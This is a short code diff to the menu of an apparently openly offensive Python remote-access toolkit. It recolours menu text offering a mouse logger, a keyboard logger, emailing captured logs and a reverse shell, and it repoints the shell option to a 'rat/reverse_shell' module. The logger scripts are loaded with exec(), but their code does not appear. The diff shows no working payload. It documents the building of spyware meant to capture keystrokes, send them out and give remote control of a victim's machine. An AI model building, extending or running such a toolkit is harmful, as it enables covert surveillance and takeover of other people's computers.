@@ -19,11 +19,11 @@ print("-------------------------------------------------------------------------
 print("\n\n")
 
 # Asks User which option they want to perform
-print("PRESS 'm' FOR MOUSE LOGGER")
-print("PRESS 'k' FOR KEYBOARD LOGGER")
-print("PRESS 'e' TO SEND LOGS TO EMAIL")
-print("PRESS 's' TO START A TCP CLIENT")
-print("PRESS ANY OTHER KEY TO EXIT PROGRAM")
+print(colored("PRESS 'm' FOR MOUSE LOGGER", 'blue'))
+print(colored("PRESS 'k' FOR KEYBOARD LOGGER", 'blue'))
+print(colored("PRESS 'e' TO SEND LOGS TO EMAIL", 'blue'))
+print(colored("PRESS 's' TO START A REVERSE SHELL", 'blue'))
+print(colored("PRESS ANY OTHER KEY TO EXIT PROGRAM", 'blue'))
 choice = input()
 print("\n\n")
 print("------------------------------------------------------------------------------------------------------")
@@ -34,7 +34,7 @@ if choice == 'm':
     # Reads
     exec(mouse_logger.read())
 elif choice == 's':
-    data = open("rat")
+    data = open("rat/reverse_shell/main.py")
 elif choice == 'k':
     keyboard_logger = open("key_logging.py")
     exec(keyboard_logger.read())
